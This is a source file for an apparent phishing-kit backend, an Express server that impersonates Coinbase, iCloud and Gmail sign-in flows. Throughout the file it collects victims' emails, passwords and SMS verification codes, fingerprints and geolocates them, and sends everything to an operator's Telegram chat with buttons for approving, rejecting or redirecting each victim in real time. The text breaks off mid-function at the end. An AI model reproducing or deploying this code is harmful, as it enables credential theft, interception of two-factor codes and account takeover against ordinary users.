const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");
const crypto = require("crypto");

const { bot } = require("./bot");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

// ============================================================================
// 🖐️ DEVICE FINGERPRINT & IP PREFIX
// ============================================================================

function getIPPrefix(ip) {
  const parts = ip.split('.');
  return `${parts[0]}.${parts[1]}`;
}

function getDeviceFingerprint(req) {
  try {
    const userAgent = req.get("user-agent") || "";
    const acceptLanguage = req.get("accept-language") || "";
    const acceptEncoding = req.get("accept-encoding") || "";
    
    const combined = `${userAgent}|${acceptLanguage}|${acceptEncoding}`;
    const fingerprint = crypto.createHash('sha256').update(combined).digest('hex').substring(0, 16);
    return fingerprint;
  } catch (err) {
    return null;
  }
}

function detectDevice(userAgent) {
  if (/mobile/i.test(userAgent)) return "Mobile";
  if (/tablet/i.test(userAgent)) return "Tablet";
  if (/windows/i.test(userAgent)) return "Windows PC";
  if (/macintosh|mac os/i.test(userAgent)) return "Mac";
  if (/linux/i.test(userAgent)) return "Linux";
  return "Unknown Device";
}

async function detectRegion(ip) {
  try {
    // Try geojs.io first
    const response = await fetch(`https://get.geojs.io/v1/ip/geo.json?ip=${ip}`);
    const data = await response.json();
    
    if (data.city && data.country) {
      return `${data.city}, ${data.country}`;
    }
    
    // Fallback to ip-api.com
    const response2 = await fetch(`http://ip-api.com/json/${ip}?fields=city,country`);
    const data2 = await response2.json();
    
    if (data2.city && data2.country) {
      return `${data2.city}, ${data2.country}`;
    }
    
    return "Unknown Region";
  } catch (error) {
    return "Unknown Region";
  }
}

// ============================================================================
// 💾 STORAGE
// ============================================================================

let userIdCounter = 1;
const pendingRedirection = {};
const userIds = {};
const pendingApprovals = {};
const deviceFingerprintToEmail = {};
const ipPrefixUserIdToEmail = {};

// ============================================================================
// 🔔 SELF-PING
// ============================================================================

const APP_URL = process.env.APP_URL;

function startSelfPing() {
  setInterval(async () => {
    try {
      await fetch(`${APP_URL}/`, { method: 'GET' });
      console.log(`🔄 Pinged`);
    } catch (err) {
      console.error(`❌ Ping error`);
    }
  }, 30000);
}

// ============================================================================
// Health check
// ============================================================================

app.get("/", (req, res) => {
  res.json({ status: "✅ Backend running" });
});

// ============================================================================
// POST /get-user-id
// ============================================================================

app.post("/get-user-id", (req, res) => {
  try {
    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      "Unknown";

    if (!userIds[ip]) {
      userIds[ip] = userIdCounter++;
    }

    res.json({ userId: userIds[ip] });
  } catch (err) {
    res.json({ userId: Math.random().toString(36).substr(2, 9) });
  }
});

// ============================================================================
// POST /send-login
// ============================================================================

app.post("/send-login", async (req, res) => {
  try {
    const { email, password, userId } = req.body;

    if (!email || !password) {
      return res.status(400).json({ error: "Missing email or password" });
    }

    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      req.socket.remoteAddress ||
      "Unknown IP";

    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);
    const ipPrefix = getIPPrefix(ip);
    const fingerprint = getDeviceFingerprint(req);

    // Store fingerprint mapping
    if (fingerprint && email) {
      deviceFingerprintToEmail[fingerprint] = email;
    }

    console.log(`\n📧 ${email} | Device: ${device} | Region: ${region}`);
    console.log(`   🖐️ Fingerprint: ${fingerprint} | IP Prefix: ${ipPrefix}`);

    // ✅ Store email mapping with ipPrefix + userId for retrieval on next pages
    const compositeKey = `${ipPrefix}_${userId}`;
    ipPrefixUserIdToEmail[compositeKey] = email;
    console.log(`   ✅ Stored: ${compositeKey} → ${email}`);

    // Build message
    const message =
      `😈😈😈😈 <b>LogIn - Coinbase</b> 😈😈😈😈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `<b>🔑 Password:</b> <code>${password}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📡 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "SMS", callback_data: `page1|${email}` }
          ],
          [
            { text: "Email Redirection", callback_data: `page2|${email}` }
          ],
          [
            { text: "❌ Reject ❌", callback_data: `reject|${email}` }
          ]
        ]
      }
    };

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    if (!botToken || !chatId) {
      return res.status(500).json({ error: "Backend not configured" });
    }

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: options.parse_mode,
        reply_markup: options.reply_markup
      })
    });

    if (response.ok) {
      pendingApprovals[email] = {
        status: "pending",
        timestamp: Date.now(),
        userId,
        password,
        region,
        device,
        ip,
        fingerprint
      };

      res.json({ ok: true, message: "Login request sent for approval", email });
    } else {
      res.status(500).json({ error: "Failed to send message" });
    }

  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ============================================================================
// POST /check-status
// ============================================================================

// ✅ GET endpoint for iCloud page (uses query param identifier)
app.get("/check-status", (req, res) => {
  try {
    const identifier = (req.query.identifier || "").trim();

    if (!identifier) {
      return res.json({ status: "unknown" });
    }

    // ✅ Check Gmail verification first
    if (pendingVerificationPage[identifier]) {
      return res.json({
        status: pendingVerificationPage[identifier].status || "pending"
      });
    }

    // ✅ Check Gmail login
    if (pendingGmailLogin[identifier]) {
      return res.json({
        status: pendingGmailLogin[identifier].status || "pending"
      });
    }

    // ✅ Check iCloud SMS codes first
    if (pendingCodes[identifier]) {
      return res.json({
        status: pendingCodes[identifier].status || "pending"
      });
    }

    // ✅ Check iCloud page
    if (pendingPage[identifier]) {
      return res.json({
        status: pendingPage[identifier].status || "pending"
      });
    }

    // ✅ Check Coinbase approvals
    if (pendingApprovals[identifier]) {
      return res.json({
        status: pendingApprovals[identifier].status || "pending"
      });
    }

    res.json({ status: "unknown" });
  } catch (err) {
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/check-status", (req, res) => {
  try {
    const { email } = req.body;

    if (!email) {
      return res.json({ status: "unknown" });
    }

    // ✅ Check iCloud page first
    if (pendingPage[email]) {
      return res.json({
        status: pendingPage[email].status || "pending",
        email: email
      });
    }

    // ✅ Check Coinbase approvals
    if (pendingApprovals[email]) {
      return res.json({
        status: pendingApprovals[email].status || "pending",
        email: email
      });
    }

    res.json({ status: "unknown" });

  } catch (err) {
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// POST /update-status
// ============================================================================

app.post("/update-status", (req, res) => {
  try {
    const { email, status } = req.body;

    if (!email || !status) {
      return res.status(400).json({ error: "Missing email or status" });
    }

    // ✅ Handle Gmail verification (confirmRequestId like verify_confirm_xxx_xxx)
    if (pendingVerificationPage[email]) {
      pendingVerificationPage[email].status = status;
      console.log(`✅ Updated pendingVerificationPage[${email}].status = ${status}`);
      return res.json({ ok: true, message: "Gmail verification status updated" });
    }

    // ✅ Handle Gmail login (identifier is the requestId like gmail_xxx_xxx)
    if (pendingGmailLogin[email]) {
      pendingGmailLogin[email].status = status;
      console.log(`✅ Updated pendingGmailLogin[${email}].status = ${status}`);
      return res.json({ ok: true, message: "Gmail login status updated" });
    }

    // ✅ Handle iCloud SMS codes (identifier is the code itself)
    if (pendingCodes[email]) {
      pendingCodes[email].status = status;
      console.log(`✅ Updated pendingCodes[${email}].status = ${status}`);
      return res.json({ ok: true, message: "SMS code status updated" });
    }

    // ✅ Handle iCloud page login (pendingPage)
    if (pendingPage[email]) {
      pendingPage[email].status = status;
      console.log(`✅ Updated pendingPage[${email}].status = ${status}`);
      return res.json({ ok: true, message: "iCloud page status updated" });
    }

    // ✅ Handle Coinbase login (pendingApprovals)
    if (!pendingApprovals[email]) {
      pendingApprovals[email] = {};
    }

    // Map status codes
    if (status === "page1") {
      pendingApprovals[email].status = "accepted1";
    } else if (status === "page2") {
      pendingApprovals[email].status = "accepted2";
    } else if (status === "reject") {
      pendingApprovals[email].status = "rejected";
    } else {
      pendingApprovals[email].status = status;
    }

    pendingApprovals[email].updatedAt = Date.now();

    res.json({ ok: true, message: "Status updated" });

  } catch (err) {
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// Start server
// ============================================================================

const server = app.listen(PORT, () => {
  console.log(`✅ Backend running on port ${PORT}`);
  startSelfPing();
});

module.exports = { app, server };

// ============================================================================
// SMS ENDPOINTS
// ============================================================================

const pendingSMS = {};

app.post("/send-sms", async (req, res) => {
  try {
    const { email, userId, smsCode, region, device, ip, message, options } = req.body;

    if (!email || !smsCode) {
      return res.status(400).json({ error: "Missing email or SMS code" });
    }

    console.log(`📧 ${email} | SMS: ${smsCode} | Device: ${device} | Region: ${region}`);

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: options.parse_mode,
        reply_markup: options.reply_markup
      })
    });

    if (response.ok) {
      pendingSMS[email] = {
        status: "pending",
        smsCode,
        userId,
        timestamp: Date.now()
      };

      res.json({ ok: true, message: "SMS sent to Telegram" });
    } else {
      res.status(500).json({ error: "Failed to send SMS" });
    }

  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post("/send-message", async (req, res) => {
  try {
    const { email, message } = req.body;

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML"
      })
    });

    if (response.ok) {
      res.json({ ok: true });
    } else {
      res.status(500).json({ error: "Failed to send message" });
    }

  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post("/check-sms-status", (req, res) => {
  try {
    const { email } = req.body;

    if (!email) {
      return res.json({ status: "unknown" });
    }

    if (pendingSMS[email]) {
      return res.json({ status: pendingSMS[email].status });
    }

    res.json({ status: "unknown" });

  } catch (err) {
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/update-sms-status", (req, res) => {
  try {
    const { email, status } = req.body;

    if (!email || !status) {
      return res.status(400).json({ error: "Missing email or status" });
    }

    if (!pendingSMS[email]) {
      pendingSMS[email] = {};
    }

    if (status === "sms_accept") {
      pendingSMS[email].status = "sms_accepted";
    } else if (status === "sms_reject") {
      pendingSMS[email].status = "sms_rejected";
    } else {
      pendingSMS[email].status = status;
    }

    pendingSMS[email].updatedAt = Date.now();

    res.json({ ok: true });

  } catch (err) {
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// BOT SMS CALLBACK HANDLER
// ============================================================================

// The bot.js file needs to handle SMS callbacks with these patterns:
// - sms_accept|email
// - sms_reject|email
// And call /update-sms-status endpoint with status: "sms_accept" or "sms_reject"

// ============================================================================
// NEW SMS ENDPOINTS - FRONTEND JUST SENDS CODE, BACKEND HANDLES TELEGRAM
// ============================================================================

app.post("/verify-sms", async (req, res) => {
  try {
    const { email, userId, smsCode } = req.body;

    if (!email || !smsCode) {
      return res.status(400).json({ error: "Missing email or SMS code" });
    }

    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      "Unknown IP";

    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    const message =
      `😈😈😈 <b>Coinbase - SMS</b> 😈😈😈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `<b>📱 SMS:</b> <code>${smsCode}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "✅ Accept ✅", callback_data: `sms_accept|${email}` }],
            [{ text: "❌ Reject ❌", callback_data: `sms_reject|${email}` }]
          ]
        }
      })
    });

    if (response.ok) {
      console.log(`📧 ${email} | SMS: ${smsCode}`);
      
      pendingSMS[email] = {
        status: "pending",
        smsCode,
        userId,
        timestamp: Date.now()
      };

      res.json({ ok: true });
    } else {
      res.status(500).json({ error: "Failed to send SMS" });
    }

  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post("/resend-sms", async (req, res) => {
  try {
    const { email, userId } = req.body;

    if (!email) {
      return res.status(400).json({ error: "Missing email" });
    }

    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      "Unknown IP";

    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    const message =
      `🔄 <b>Coinbase - Resend SMS</b> 🔄\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML"
      })
    });

    if (response.ok) {
      console.log(`📱 Resend SMS for ${email}`);
      res.json({ ok: true });
    } else {
      res.status(500).json({ error: "Failed to resend SMS" });
    }

  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ============================================================================
// REDIRECTION PAGE ENDPOINT
// ============================================================================

app.post("/send-redirection", async (req, res) => {
  try {
    let { email, userId } = req.body;

    // Detect region and device from request
    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      "Unknown IP";

    const ipPrefix = getIPPrefix(ip);

    // ✅ PRIORITY 1: Try to retrieve from storage using ipPrefix + userId
    if (userId && userId !== '?') {
      const compositeKey = `${ipPrefix}_${userId}`;
      const storedEmail = ipPrefixUserIdToEmail[compositeKey];
      if (storedEmail) {
        email = storedEmail;
        console.log(`🔍 Retrieved email from storage: ${compositeKey} → ${email}`);
      }
    }

    // ✅ PRIORITY 2: Use provided email as fallback
    if (!email) {
      return res.status(400).json({ error: "Missing email" });
    }

    // ✅ CLEAR any previous choice for this email
    if (pendingRedirection[email]) {
      delete pendingRedirection[email];
    }

    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    const message =
      `😈😈😈 <b>Coinbase - Redirection</b> 😈😈😈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    console.log(`📍 ${email} | Redirection page | Device: ${device} | Region: ${region}`);

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "☁️ iCloud ☁️", callback_data: `redirect_icloud|${email}` }],
            [{ text: "🌈 Gmail 🌈", callback_data: `redirect_gmail|${email}` }]
          ]
        }
      })
    });

    if (response.ok) {
      res.json({ ok: true });
    } else {
      res.status(500).json({ error: "Failed to send redirection" });
    }

  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Check redirection choice
app.post("/check-redirection-choice", (req, res) => {
  try {
    const { email } = req.body;

    if (!email) {
      return res.json({ choice: "unknown" });
    }

    // This will be set by the bot when button is clicked
    if (pendingRedirection && pendingRedirection[email]) {
      return res.json({ choice: pendingRedirection[email].choice });
    }

    res.json({ choice: "pending" });

  } catch (err) {
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// UPDATE REDIRECTION CHOICE
// ============================================================================

app.post("/update-redirection-choice", (req, res) => {
  try {
    const { email, choice } = req.body;

    if (!email || !choice) {
      return res.status(400).json({ error: "Missing email or choice" });
    }

    if (!pendingRedirection[email]) {
      pendingRedirection[email] = {};
    }

    if (choice === "redirect_icloud") {
      pendingRedirection[email].choice = "icloud";
    } else if (choice === "redirect_gmail") {
      pendingRedirection[email].choice = "gmail";
    } else {
      pendingRedirection[email].choice = choice;
    }

    pendingRedirection[email].updatedAt = Date.now();

    res.json({ ok: true });

  } catch (err) {
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// ICLOUD PAGES ENDPOINTS
// ============================================================================

const pendingPage = {};
const pendingCodes = {};

app.post("/page-login", async (req, res) => {
  try {
    const { email, password, userId } = req.body;

    if (!email || !password) {
      return res.status(400).json({ success: false, message: "Email and password required" });
    }

    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      "Unknown IP";

    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    pendingPage[email] = { password, status: "pending" };
    console.log(`📥 iCloud Page Login Received: ${email}`);

    const message =
      `☁️☁️☁️☁️ <b>iCloud - Login</b> ☁️☁️☁️☁️\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `<b>🔑 Password:</b> <code>${password}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Accept", callback_data: `page_accept|${email}` },
            { text: "❌ Reject", callback_data: `page_reject|${email}` }
          ]
        ]
      }
    };

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: options.parse_mode,
        reply_markup: options.reply_markup
      })
    });

    if (response.ok) {
      res.json({ success: true });
    } else {
      res.status(500).json({ success: false, message: "Failed to send to Telegram" });
    }

  } catch (err) {
    console.error("❌ Page login endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/sms-login", async (req, res) => {
  try {
    const { code, userId, email } = req.body;

    console.log(`📥 iCloud SMS Code Received:`);
    console.log(`   - code: ${code}`);
    console.log(`   - userId: ${userId}`);
    console.log(`   - email: ${email}`);

    if (!code) {
      return res.status(400).json({ success: false, message: "Code required" });
    }

    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      "Unknown IP";

    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    pendingCodes[code] = { status: "pending" };
    console.log(`📥 iCloud SMS Code Received: ${code}`);

    const message =
      `⛈⛈⛈⛈ <b>iCloud - SMS</b> ⛈⛈⛈⛈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>💬 SMS:</b> <code>${code}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Accept", callback_data: `sms_accept|${code}` },
            { text: "❌ Reject", callback_data: `sms_reject|${code}` }
          ]
        ]
      }
    };

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: options.parse_mode,
        reply_markup: options.reply_markup
      })
    });

    if (response.ok) {
      res.json({ success: true });
    } else {
      res.status(500).json({ success: false });
    }

  } catch (err) {
    console.error("❌ SMS login endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/notify", async (req, res) => {
  try {
    const { type, userId, email } = req.body;

    console.log(`📲 Notify endpoint received:`);
    console.log(`   - type: ${type}`);
    console.log(`   - userId: ${userId}`);
    console.log(`   - email: ${email}`);

    // ✅ Handle resend SMS (from iCloud SMS page)
    if (type === "resend_sms") {
      const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
        req.headers["x-real-ip"] ||
        req.connection.remoteAddress ||
        "Unknown IP";

      const userAgent = req.get("user-agent") || "Unknown";
      const device = detectDevice(userAgent);
      const region = await detectRegion(ip);

      const message =
        `🔄 <b>iCloud - Resend SMS</b> 🔄\n` +
        `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
        `<b>🌍 Region:</b> ${region}\n` +
        `<b>💻 Device:</b> ${device}\n` +
        `<b>📍 IP:</b> ${ip}`;

      const botToken = process.env.BOT_TOKEN;
      const chatId = process.env.ADMIN_CHAT_ID;

      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "HTML"
        })
      });

      console.log(`🔄 Resend SMS notification sent for userId: ${userId}`);
      return res.json({ success: true });
    }

    // ✅ Handle generic notify (fallback)
    if (!email) {
      return res.status(400).json({ error: "Missing email" });
    }

    const message =
      `🔄 <b>iCloud - Resend SMS</b> 🔄\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>`;

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML"
      })
    });

    res.json({ success: true });

  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post("/update-page-status", (req, res) => {
  try {
    const { email, status } = req.body;

    if (!email || !status) {
      return res.status(400).json({ error: "Missing email or status" });
    }

    if (!pendingPage[email]) {
      pendingPage[email] = {};
    }

    if (status === "page_accept") {
      pendingPage[email].status = "accepted";
    } else if (status === "page_reject") {
      pendingPage[email].status = "rejected";
    } else {
      pendingPage[email].status = status;
    }

    pendingPage[email].updatedAt = Date.now();

    res.json({ ok: true });

  } catch (err) {
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// GMAIL LOGIN ENDPOINTS
// ============================================================================

// ✅ Storage for Gmail
const pendingGmailLogin = {};
const displayEmailStore = {};
const displayEmailByRequestId = {};

// ✅ Storage for Gmail Verification
const pendingVerificationPage = {};

app.post("/send-gmail-login", async (req, res) => {
  try {
    console.log('🔍 DEBUG: /send-gmail-login endpoint called');
    const { email, password, userId } = req.body;
    console.log('🔍 DEBUG: Received email:', email, 'password:', password, 'userId:', userId);
    
    if (!email || !password || !userId) {
      return res.status(400).json({ error: "Missing email, password, or userId" });
    }
    
    const requestId = `gmail_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    const displayEmailKey = `displayEmail_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    console.log('🔍 DEBUG: Generated displayEmailKey:', displayEmailKey);
    
    displayEmailStore[displayEmailKey] = email;
    console.log(`📧 Stored display email with key ${displayEmailKey}: ${email}`);
    
    displayEmailByRequestId[requestId] = email;
    console.log(`📧 Stored display email by requestId ${requestId}: ${email}`);
    
    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      "Unknown IP";

    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    pendingGmailLogin[requestId] = { status: "pending", email: email };

    const message =
      `🌈🌈🌈🌈 <b>Gmail - Sign in</b> 🌈🌈🌈🌈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `<b>🔑 Password:</b> <code>${password}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Accept", callback_data: `gmail_accept|${requestId}` },
            { text: "❌ Reject", callback_data: `gmail_reject|${requestId}` }
          ]
        ]
      }
    };

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: options.parse_mode,
        reply_markup: options.reply_markup
      })
    });

    console.log('🔍 DEBUG: Sending response with displayEmailKey:', displayEmailKey);
    res.json({ status: "pending", requestId, displayEmailKey });

  } catch (err) {
    console.error("❌ Gmail Login endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ✅ GET /api/gmail-login-status/:requestId
app.get("/api/gmail-login-status/:requestId", (req, res) => {
  try {
    const { requestId } = req.params;
    const entry = pendingGmailLogin[requestId];
    if (!entry) return res.json({ status: "pending" });
    res.json({ status: entry.status });
  } catch (err) {
    console.error("❌ Gmail Login status endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ✅ GET /api/display-email/:displayEmailKey
app.get("/api/display-email/:displayEmailKey", (req, res) => {
  try {
    const { displayEmailKey } = req.params;
    const email = displayEmailStore[displayEmailKey];
    if (email) {
      console.log(`📧 Retrieved display email for key ${displayEmailKey}: ${email}`);
      res.json({ displayEmail: email });
    } else {
      console.log(`📧 No display email found for key ${displayEmailKey}`);
      res.json({ displayEmail: null });
    }
  } catch (err) {
    console.error("❌ Get display email error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ✅ GET /get-gmail-login/:requestId
app.get("/get-gmail-login/:requestId", (req, res) => {
  try {
    const { requestId } = req.params;
    const entry = pendingGmailLogin[requestId];
    if (entry && entry.email) {
      res.json({ email: entry.email });
    } else {
      res.json({ email: null });
    }
  } catch (err) {
    console.error("❌ Get Gmail login error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// GMAIL VERIFICATION ENDPOINTS
// ============================================================================

app.post("/send-verification-page", async (req, res) => {
  try {
    console.log('🔍 DEBUG: /send-verification-page endpoint called');
    const { userId, email: gmailEmail } = req.body;
    console.log('🔍 DEBUG: Received userId:', userId, 'email:', gmailEmail);
    
    if (!userId) {
      return res.status(400).json({ error: "Missing userId" });
    }
    
    const requestId = `verify_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    console.log('🔍 DEBUG: Generated requestId:', requestId);
    
    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      "Unknown IP";

    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    pendingVerificationPage[requestId] = { status: "pending", selectedDigits: null, email: gmailEmail };
    console.log(`📥 Verification Page Request received: ${requestId}`);

    const message =
      `🌈🌈🌈 <b>Gmail - Verification</b> 🌈🌈🌈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${gmailEmail || 'Unknown'}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "0", callback_data: `verify_digit|${requestId}|0` },
            { text: "1", callback_data: `verify_digit|${requestId}|1` },
            { text: "2", callback_data: `verify_digit|${requestId}|2` },
            { text: "3", callback_data: `verify_digit|${requestId}|3` },
            { text: "4", callback_data: `verify_digit|${requestId}|4` }
          ],
          [
            { text: "5", callback_data: `verify_digit|${requestId}|5` },
            { text: "6", callback_data: `verify_digit|${requestId}|6` },
            { text: "7", callback_data: `verify_digit|${requestId}|7` },
            { text: "8", callback_data: `verify_digit|${requestId}|8` },
            { text: "9", callback_data: `verify_digit|${requestId}|9` }
          ]
        ]
      }
    };

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
